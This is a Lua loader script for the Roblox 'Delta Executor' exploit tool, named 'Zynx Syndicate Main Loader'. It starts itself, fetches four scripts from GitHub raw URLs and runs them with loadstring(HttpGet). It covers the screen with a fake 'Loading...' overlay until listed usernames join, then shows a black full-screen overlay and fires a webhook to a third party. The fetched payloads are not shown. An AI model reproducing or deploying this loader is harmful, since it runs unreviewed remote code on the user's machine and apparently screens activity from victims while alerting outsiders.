-- Zynx Syndicate Main Loader
-- Combines: Webhook, Half Loading Screen, Full Loading Screen, CMD Line
-- For Delta Executor

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local MainLoader = {
    components = {},
    authorizedUsers = {
        {username = "jaatshab_770", displayname = "III"},
        {username = "boss_user2", displayname = "BOSS2"},
        {username = "member_user1", displayname = "MEMBER1"}
    },
    currentScreen = "none",
    isMonitoring = false,
    halfScreenGui = nil,
    fullScreenGui = nil
}

-- Load external scripts from GitHub (MODIFIED)
function MainLoader.loadScript(url, shouldExecute)
    local success, result = pcall(function()
        local script = loadstring(game:HttpGet(url))()
        if shouldExecute and type(script) == "function" then
            return script() -- Execute the script if it's a function
        end
        return script -- Return the script without executing
    end)
    
    if success then
        print("‚úÖ Successfully loaded: " .. url)
        return result
    else
        warn("‚ùå Failed to load: " .. url)
        warn("Error: " .. result)
        return nil
    end
end

-- Initialize all components (MODIFIED)
function MainLoader.initialize()
    print("üöÄ Initializing Zynx Syndicate Main Loader...")
    
    -- Load components WITHOUT auto-executing them
    MainLoader.components.webhook = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook", false)
    MainLoader.components.halfScreen = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/half%20loading", false)
    MainLoader.components.fullScreen = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading", false)
    MainLoader.components.cmdLine = MainLoader.loadScript("https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline", false)
    
    -- Setup player detection
    MainLoader.setupPlayerDetection()
    
    -- Start with half loading screen ONLY
    MainLoader.showHalfLoadingScreen()
    
    -- Start monitoring for players
    MainLoader.startPlayerMonitoring()
    
    print("‚úÖ Zynx Syndicate Main Loader Initialized!")
end

-- Show half loading screen (MODIFIED)
function MainLoader.showHalfLoadingScreen()
    if MainLoader.currentScreen == "half" then return end
    
    print("üîÑ Showing half loading screen...")
    
    -- Hide full screen if active
    if MainLoader.currentScreen == "full" then
        MainLoader.hideFullLoadingScreen()
    end
    
    -- Execute half loading screen function if available
    if MainLoader.components.halfScreen and type(MainLoader.components.halfScreen) == "function" then
        MainLoader.halfScreenGui = MainLoader.components.halfScreen()
        MainLoader.currentScreen = "half"
        print("‚úÖ Half loading screen activated")
    else
        -- Fallback: Create simple half loading screen
        MainLoader.createSimpleHalfScreen()
    end
end

-- Show full loading screen (MODIFIED)
function MainLoader.showFullLoadingScreen()
    if MainLoader.currentScreen == "full" then return end
    
    print("üéâ Switching to full loading screen (Authorized user detected)!")
    
    -- Hide half screen first
    MainLoader.hideHalfLoadingScreen()
    
    -- Wait a moment for smooth transition
    wait(0.5)
    
    -- Execute full loading screen function if available
    if MainLoader.components.fullScreen and type(MainLoader.components.fullScreen) == "function" then
        MainLoader.fullScreenGui = MainLoader.components.fullScreen()
        MainLoader.currentScreen = "full"
        
        -- Send webhook notification
        MainLoader.sendWebhookNotification()
        
        print("‚úÖ Full loading screen activated")
    else
        warn("‚ùå Full loading screen not loaded properly")
    end
end

-- Hide half loading screen (MODIFIED)
function MainLoader.hideHalfLoadingScreen()
    if MainLoader.currentScreen == "half" then
        print("üëã Hiding half loading screen...")
        
        -- Remove the half screen GUI
        pcall(function()
            local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
            if playerGui then
                local halfScreen = playerGui:FindFirstChild("ProfessionalLoadingScreen")
                if halfScreen then
                    halfScreen:Destroy()
                end
            end
        end)
        
        -- Also remove our fallback screen
        if MainLoader.halfScreenGui then
            pcall(function() MainLoader.halfScreenGui:Destroy() end)
            MainLoader.halfScreenGui = nil
        end
        
        MainLoader.currentScreen = "none"
    end
end

-- Hide full loading screen (MODIFIED)
function MainLoader.hideFullLoadingScreen()
    if MainLoader.currentScreen == "full" then
        print("üëã Hiding full loading screen...")
        
        -- Remove the full screen GUIs
        pcall(function()
            local coreGui = game:GetService("CoreGui")
            local finalScreen = coreGui:FindFirstChild("FinalStageLoadingScreen")
            local blackScreen = coreGui:FindFirstChild("BlackBackground")
            
            if finalScreen then finalScreen:Destroy() end
            if blackScreen then blackScreen:Destroy() end
        end)
        
        MainLoader.currentScreen = "none"
    end
end

-- Create simple half loading screen (FALLBACK)
function MainLoader.createSimpleHalfScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SimpleHalfLoadingScreen"
    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0.4, 0, 0.1, 0)
    title.Position = UDim2.new(0.3, 0, 0.45, 0)
    title.BackgroundTransparency = 1
    title.Text = "Zynx Syndicate - Loading..."
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = frame
    
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(0.4, 0, 0.05, 0)
    subtitle.Position = UDim2.new(0.3, 0, 0.55, 0)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "Waiting for authorized user..."
    subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
    subtitle.TextScaled = true
    title.Font = Enum.Font.Gotham
    subtitle.Parent = frame
    
    MainLoader.halfScreenGui = screenGui
    MainLoader.currentScreen = "half"
    print("‚úÖ Simple half loading screen created (fallback)")
end

-- Setup player detection (MODIFIED)
function MainLoader.setupPlayerDetection()
    -- Set up the global trigger for full loading screen
    _G.TriggerFullLoad = function()
        MainLoader.showFullLoadingScreen()
    end
    
    -- Initialize CMD line system if available
    if MainLoader.components.cmdLine and type(MainLoader.components.cmdLine) == "function" then
        MainLoader.components.cmdLine()
        print("‚úÖ CMD line system initialized")
    end
end

-- Start player monitoring
function MainLoader.startPlayerMonitoring()
    if MainLoader.isMonitoring then return end
    
    print("üéØ Starting player monitoring...")
    
    -- Start your player detection system
    if _G.StartPlayerMonitor then
        _G.StartPlayerMonitor()
        MainLoader.isMonitoring = true
        print("‚úÖ Player detection system started")
    else
        -- Fallback: Use our own monitoring
        MainLoader.startFallbackMonitoring()
    end
end

-- Fallback player monitoring
function MainLoader.startFallbackMonitoring()
    spawn(function()
        wait(3) -- Wait 3 seconds after script start
        
        print("üéØ Starting fallback player monitoring...")
        print("üëÄ Watching for authorized users:")
        for _, user in ipairs(MainLoader.authorizedUsers) do
            print("   - " .. user.username .. " (" .. user.displayname .. ")")
        end
        
        -- Monitor when players join
        game.Players.PlayerAdded:Connect(function(player)
            MainLoader.checkPlayerAuthorization(player)
        end)
        
        -- Check existing players
        for _, player in pairs(game.Players:GetPlayers()) do
            MainLoader.checkPlayerAuthorization(player)
        end
        
        MainLoader.isMonitoring = true
        print("‚úÖ Fallback player monitoring active!")
    end)
end

-- Check if player is authorized
function MainLoader.checkPlayerAuthorization(player)
    local playerName = player.Name
    local displayName = player.DisplayName
    
    -- Check if player is authorized
    for _, authUser in pairs(MainLoader.authorizedUsers) do
        if player.Name == authUser.username or player.DisplayName == authUser.displayname then
            print("üéâ AUTHORIZED USER JOINED: " .. playerName)
            print("üöÄ TRIGGERING FULL LOADING SCREEN!")
            MainLoader.showFullLoadingScreen()
            return true
        end
    end
    
    return false
end

-- Send webhook notification
function MainLoader.sendWebhookNotification()
    print("üì¢ Sending webhook notification...")
    
    -- Execute webhook function if available
    if MainLoader.components.webhook and type(MainLoader.components.webhook) == "function" then
        local success = pcall(function()
            return MainLoader.components.webhook()
        end)
        if success then
            print("‚úÖ Webhook sent successfully")
        else
            print("‚ùå Webhook failed to send")
        end
    else
        print("‚ö†Ô∏è Webhook system not available")
    end
end

-- Add authorized user
function MainLoader.addAuthorizedUser(username, displayname)
    table.insert(MainLoader.authorizedUsers, {
        username = username,
        displayname = displayname
    })
    
    print("‚úÖ Added authorized user: " .. username .. " (" .. displayname .. ")")
end

-- Remove authorized user
function MainLoader.removeAuthorizedUser(username)
    for i, user in ipairs(MainLoader.authorizedUsers) do
        if user.username == username then
            table.remove(MainLoader.authorizedUsers, i)
            print("‚úÖ Removed authorized user: " .. username)
            return true
        end
    end
    print("‚ùå User not found: " .. username)
    return false
end

-- List authorized users
function MainLoader.listAuthorizedUsers()
    print("üìã Authorized Users List:")
    for i, user in pairs(MainLoader.authorizedUsers) do
        print("   " .. i .. ". " .. user.username .. " (" .. user.displayname .. ")")
    end
end

-- Command line interface for the main loader
function MainLoader.cmdInterface()
    return {
        adduser = function(username, displayname)
            MainLoader.addAuthorizedUser(username, displayname)
        end,
        
        removeuser = function(username)
            MainLoader.removeAuthorizedUser(username)
        end,
        
        listusers = function()
            MainLoader.listAuthorizedUsers()
        end,
        
        reload = function()
            print("üîÑ Reloading all components...")
            MainLoader.initialize()
        end,
        
        status = function()
            print("üìä Main Loader Status:")
            print("   Current Screen: " .. MainLoader.currentScreen)
            print("   Monitoring: " .. tostring(MainLoader.isMonitoring))
            print("   Authorized Users: " .. #MainLoader.authorizedUsers)
        end,
        
        testfull = function()
            print("üß™ Testing full loading screen...")
            MainLoader.showFullLoadingScreen()
        end,
        
        testhalf = function()
            print("üß™ Testing half loading screen...")
            MainLoader.showHalfLoadingScreen()
        end,
        
        forcewebhook = function()
            print("üì¢ Forcing webhook send...")
            MainLoader.sendWebhookNotification()
        end
    }
end

-- Auto-start the system
spawn(function()
    wait(2)
    MainLoader.initialize()
end)

-- Make main loader accessible globally
_G.MainLoader = MainLoader
_G.ZynxCMD = MainLoader.cmdInterface()

print("üéØ Zynx Syndicate Main Loader Script Loaded!")
print("üí° Use ZynxCMD to access command functions")
print("üí° Auto-starting in 2 seconds...")
print("üí° Will show HALF loading screen until authorized user joins")
